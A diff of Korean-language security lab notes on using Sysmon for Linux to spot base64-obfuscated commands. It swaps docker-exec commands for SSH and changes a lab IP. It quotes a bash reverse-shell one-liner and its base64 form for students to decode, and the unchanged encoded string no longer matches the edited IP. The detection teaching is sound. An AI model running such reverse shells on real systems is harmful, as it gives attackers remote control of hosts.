@@ -337,10 +337,10 @@ graph TD
 
 ```bash
 # el34-web 안에서 인코딩 명령 실행 (짧게 살고 죽음)
-docker exec el34-web python3 -c "import base64; base64.b64decode('aGk=')  # w11 reverse-shell sim"
+ssh ccc@10.20.32.80 python3 -c "import base64; base64.b64decode('aGk=')  # w11 reverse-shell sim"
 
 # osquery 스냅샷 — 이미 죽은 프로세스 → 빈 결과
-docker exec el34-web osqueryi --json \
+ssh ccc@10.20.32.80 osqueryi --json \
   'SELECT pid,cmdline FROM processes WHERE cmdline LIKE "%b64decode%";'
 #   → []   (스냅샷의 사각)
 
@@ -395,7 +395,7 @@ grep -a 'Linux-Sysmon' /var/log/syslog | grep -a '<EventID>3<' | grep -a 53666 |
 **el34 에서 어떻게**:
 
 ```bash
-docker exec el34-web sh -c 'echo payload > /tmp/w11_payload.b64'
+ssh ccc@10.20.32.80 'echo payload > /tmp/w11_payload.b64'
 grep -a 'Linux-Sysmon' /var/log/syslog | grep -a '<EventID>11<' | grep -a w11 | tail -1
 #   → <EventID>11</EventID> … <TargetFilename>/tmp/w11_payload.b64</TargetFilename>
 ```
@@ -444,14 +444,14 @@ graph TD
 공격자는 명령을 base64 로 인코딩해 의도를 숨긴다. 디코드하면 원래 명령이 드러난다.
 
 ```bash
-echo 'bash -i >& /dev/tcp/10.20.30.202/53666 0>&1' | base64
+echo 'bash -i >& /dev/tcp/192.168.0.202/53666 0>&1' | base64
 #  → YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4yMC4zMC4yMDIvNTM2NjYgMD4mMQo=
 
 echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4yMC4zMC4yMDIvNTM2NjYgMD4mMQo=' | base64 -d
-#  → bash -i >& /dev/tcp/10.20.30.202/53666 0>&1     (리버스셸!)
+#  → bash -i >& /dev/tcp/192.168.0.202/53666 0>&1     (리버스셸!)
 ```
 
-`base64 -d`(decode)로 풀면 `/dev/tcp/10.20.30.202/53666` 로 셸을 되돌리는 리버스셸임이
+`base64 -d`(decode)로 풀면 `/dev/tcp/192.168.0.202/53666` 로 셸을 되돌리는 리버스셸임이
 드러난다. 그리고 sysmon 의 ProcessCreate 는 이 디코딩·실행 명령(`base64 -d`, `b64decode`)의
 **cmdline 자체** 를 이벤트로 남기므로, 사후에도 "무엇을 디코드해 실행했나" 를 추적할 수
 있다.
@@ -490,7 +490,7 @@ Suricata(IPS, W03–W04)와 ModSec(WAF, W05)이, 다소스 통합 평결은 Wazu
 
 ## 6. 실습 안내 (총 9 미션)
 
-각 실습은 **4축 설명** 을 포함한다. 공격은 `docker exec el34-web …` 로, sysmon 관측은
+각 실습은 **4축 설명** 을 포함한다. 공격은 `ssh ccc@10.20.32.80 …` 로, sysmon 관측은
 호스트(`ssh ccc@192.168.0.80`)의 `/var/log/syslog` 로 한다. **sysmon 데몬 자체는 영속
 인프라(유지)** 이며, 실습이 만든 계정·파일·프로세스만 self-clean 한다.
 
